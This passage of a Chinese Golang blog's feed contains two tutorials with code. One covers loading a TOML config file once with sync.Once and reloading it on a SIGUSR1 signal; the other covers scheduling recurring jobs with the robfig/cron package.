&#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">"parse toml file once. filePath: %s\n"</span>, filePath)</span><br><span class="line"><span class="keyword">if</span> _ , err := toml.DecodeFile(filePath, &amp;conf); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span> conf</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里我们使用了<code>sync.Once</code>的<code>Do</code>方法，<code>Do</code>方法当且仅当第一次被调用时才执行函数。如果<code>once.Do(f)</code>被多次调用，只有第一次调用会执行<code>f</code>，即使<code>f</code>每次调用<code>Do</code>提供的<code>f</code>值不同。需要给每个要执行仅一次的函数都建立一个Once类型的实例。</p></blockquote><p>这样我们就保证了tomlConfig对象是一个单例模式，只需要解析一次，可以在任何地方调用。调用例子如下：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 配置中DB的IP</span></span><br><span class="line">fmt.Println(conf.Config().DB.Server)</span><br><span class="line"><span class="comment">// 配置中Owner的名字</span></span><br><span class="line">fmt.Println(conf.Config().Owner.Name)</span><br></pre></td></tr></table></figure><h1 id="配置的更新"><a href="#配置的更新" class="headerlink" title="配置的更新"></a>配置的更新</h1><p>如果我们的项目是一个常驻的项目（比如http server），我们会希望能够提供更新配置的功能，平滑的替换掉配置，不需要重启项目。</p><p>其实思路很想简单，我们只需要起一个协程，监视我们定义好的信号，如果接收到信号就重新加载配置。</p><p>下面我们来写下，更新配置的代码：<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">signal.Notify(s, syscall.SIGUSR1)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">&lt;-s</span><br><span class="line">conf.ReloadConfig()</span><br><span class="line">log.Println(<span class="string">"Reloaded config"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure></p><p>我们监视了<code>syscall.SIGUSR1</code>信号，其值是30，接收到信号就执行<code>conf.ReloadConfig()</code>方法。</p><p>再来看下<code>conf</code>中方法变动：<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">conf * tomlConfig</span><br><span class="line">once sync.Once</span><br><span class="line">cfgLock sync.RWMutex</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Config</span><span class="params">()</span> *<span class="title">tomlConfig</span></span> &#123;</span><br><span class="line">once.Do(ReloadConfig)</span><br><span class="line">cfgLock.RLock()</span><br><span class="line"><span class="keyword">defer</span> cfgLock.RUnlock()</span><br><span class="line"><span class="keyword">return</span> conf</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReloadConfig</span><span class="params">()</span></span> &#123;</span><br><span class="line">filePath, err := filepath.Abs(<span class="string">"./toml/config.toml"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">"parse toml file once. filePath: %s\n"</span>, filePath)</span><br><span class="line">config := <span class="built_in">new</span>(tomlConfig)</span><br><span class="line"><span class="keyword">if</span> _ , err := toml.DecodeFile(filePath, config); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">cfgLock.Lock()</span><br><span class="line"><span class="keyword">defer</span> cfgLock.Unlock()</span><br><span class="line">conf = config</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>原来加载配置的代码放到<code>ReloadConfig</code>方法中去了，还在给变量<code>conf</code>赋值的时候加了读写锁，以保证安全。在<code>Config</code>方法中获取<code>conf</code>的时候加了读锁，防止在读的时候，也在写入，导致配置错乱。</p><p>启动server之后，可以通过如下shell命令更新配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -SIGUSR1 1078</span><br></pre></td></tr></table></figure></p><p>其中的1078是go server的进程号。执行这条命令之后，会向go server发送<code>syscall.SIGUSR1</code>的信号，从而触发更新配置的动作。</p><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><h2 id="conf-go"><a href="#conf-go" class="headerlink" title="conf.go"></a>conf.go</h2><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> conf</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"github.com/BurntSushi/toml"</span></span><br><span class="line"><span class="string">"path/filepath"</span></span><br><span class="line"><span class="string">"sync"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">conf * tomlConfig</span><br><span class="line">once sync.Once</span><br><span class="line">cfgLock sync.RWMutex</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Config</span><span class="params">()</span> *<span class="title">tomlConfig</span></span> &#123;</span><br><span class="line">once.Do(ReloadConfig)</span><br><span class="line">cfgLock.RLock()</span><br><span class="line"><span class="keyword">defer</span> cfgLock.RUnlock()</span><br><span class="line"><span class="keyword">return</span> conf</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReloadConfig</span><span class="params">()</span></span> &#123;</span><br><span class="line">filePath, err := filepath.Abs(<span class="string">"./toml/config.toml"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">"parse toml file once. filePath: %s\n"</span>, filePath)</span><br><span class="line">config := <span class="built_in">new</span>(tomlConfig)</span><br><span class="line"><span class="keyword">if</span> _ , err := toml.DecodeFile(filePath, config); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">cfgLock.Lock()</span><br><span class="line"><span class="keyword">defer</span> cfgLock.Unlock()</span><br><span class="line">conf = config</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> tomlConfig <span class="keyword">struct</span> &#123;</span><br><span class="line">Title <span class="keyword">string</span></span><br><span class="line">Owner ownerInfo</span><br><span class="line">DB database <span class="string">`toml:"database"`</span></span><br><span class="line">Servers <span class="keyword">map</span>[<span class="keyword">string</span>]server</span><br><span class="line">Clients clients</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ownerInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="keyword">string</span></span><br><span class="line">Org <span class="keyword">string</span> <span class="string">`toml:"organization"`</span></span><br><span class="line">Bio <span class="keyword">string</span></span><br><span class="line">DOB time.Time</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> database <span class="keyword">struct</span> &#123;</span><br><span class="line">Server <span class="keyword">string</span></span><br><span class="line">Ports []<span class="keyword">int</span></span><br><span class="line">ConnMax <span class="keyword">int</span> <span class="string">`toml:"connection_max"`</span></span><br><span class="line">Enabled <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> server <span class="keyword">struct</span> &#123;</span><br><span class="line">IP <span class="keyword">string</span></span><br><span class="line">DC <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> clients <span class="keyword">struct</span> &#123;</span><br><span class="line">Data [][]<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">Hosts []<span class="keyword">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="main-go"><a href="#main-go" class="headerlink" title="main.go"></a>main.go</h2><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"go-example/toml/conf"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 配置中DB的IP</span></span><br><span class="line">fmt.Println(conf.Config().DB.Server)</span><br><span class="line"><span class="comment">// 配置中Owner的名字</span></span><br><span class="line">fmt.Println(conf.Config().Owner.Name)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一个项目通常是有很多配置的，比如PHP的php.ini文件、Nginx的server.conf文件，那么Golang的项目又适合使用怎样的配
      
    
    </summary>
    
    
      <category term="Golang" scheme="https://blog.smilexin.cn/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>Golang robfig/cron包实现定时任务</title>
    <link href="https://blog.smilexin.cn/2021/10/19/Golang%20%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1.html"/>
    <id>https://blog.smilexin.cn/2021/10/19/Golang 定时任务.html</id>
    <published>2021-10-18T16:00:00.000Z</published>
    <updated>2021-10-19T06:01:18.566Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>robfig/cron是GO语言中一个定时执行注册任务的package。</p><ul><li>文档地址：<a href="http://godoc.org/github.com/robfig/cron" target="_blank" rel="noopener">http://godoc.org/github.com/robfig/cron</a></li><li>Git repo：<a href="https://github.com/robfig/cron" target="_blank" rel="noopener">https://github.com/robfig/cron</a></li></ul><h1 id="安装依赖包"><a href="#安装依赖包" class="headerlink" title="安装依赖包"></a>安装依赖包</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/robfig/cron</span><br></pre></td></tr></table></figure><h1 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h1><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/robfig/cron"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">s2</span><span class="params">()</span></span>&#123;</span><br><span class="line">log.Println(<span class="string">"s2 func running"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> TestJob <span class="keyword">struct</span> &#123;</span><br><span class="line">j <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *TestJob)</span> <span class="title">Run</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 指针,改变原来的User对象值</span></span><br><span class="line">this.j = this.j + <span class="number">1</span></span><br><span class="line">log.Println(<span class="string">"testJob1.RUN j = "</span>, this.j)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> TestJob2 <span class="keyword">struct</span> &#123;</span><br><span class="line">j <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this TestJob2)</span> <span class="title">Run</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 函数中结构体作为参数,如果不是用结构指针,函数内参数属性的改变不影响原来对象的属性的改变</span></span><br><span class="line">this.j = this.j + <span class="number">1</span></span><br><span class="line">log.Println(<span class="string">"testJob2.RUN j = "</span>, this.j)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">i := <span class="number">0</span></span><br><span class="line">c := cron.New()</span><br><span class="line">spec := <span class="string">"*/5 * * * * ?"</span></span><br><span class="line">c.AddFunc(spec, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">i++</span><br><span class="line">log.Println(<span class="string">"5s cron running:"</span>, i)</span><br><span class="line">&#125;)</span><br><span class="line">c.AddFunc(<span class="string">"*/2 * * * * ?"</span>, s2)</span><br><span class="line">job := &amp;TestJob&#123; j: <span class="number">0</span>&#125;</span><br><span class="line">c.AddJob(<span class="string">"*/2 * * * * ?"</span>, job)</span><br><span class="line">c.AddJob(<span class="string">"*/2 * * * * ?"</span>, TestJob2&#123;j:<span class="number">0</span>&#125;)</span><br><span class="line">c.Start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Output:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2021/10/19 11:56:10 s2 func running</span><br><span class="line">2021/10/19 11:56:10 testJob2.RUN j =  1</span><br><span class="line">2021/10/19 11:56:10 testJob1.RUN j =  1</span><br><span class="line">2021/10/19 11:56:10 5s cron running: 1</span><br><span class="line">2021/10/19 11:56:12 s2 func running</span><br><span class="line">2021/10/19 11:56:12 testJob2.RUN j =  1</span><br><span class="line">2021/10/19 11:56:12 testJob1.RUN j =  2</span><br><span class="line">2021/10/19 11:56:14 s2 func running</span><br><span class="line">2021/10/19 11:56:14 testJob2.RUN j =  1</span><br><span class="line">2021/10/19 11:56:14 testJob1.RUN j =  3</span><br><span class="line">2021/10/19 11:56:15 5s cron running: 2</span><br><span class="line">2021/10/19 11:56:16 s2 func running</span><br><span class="line">2021/10/19 11:56:16 testJob2.RUN j =  1</span><br><span class="line">2021/10/19 11:56:16 testJob1.RUN j =  4</span><br></pre></td></tr></table></figure></p><p><strong>可结合 <code>toml</code> <code>yaml</code> 配置需要定时执行的任务</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;robfig/cron是GO语言中一个定时执行注册任务的package。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文档地址：&lt;a href=&quot;http:/
      
    
    </summary>
    
    
      <category term="Golang" scheme="https://blog.smilexin.cn/tags/Golang/"/>
    
  </entry>
  
</feed>
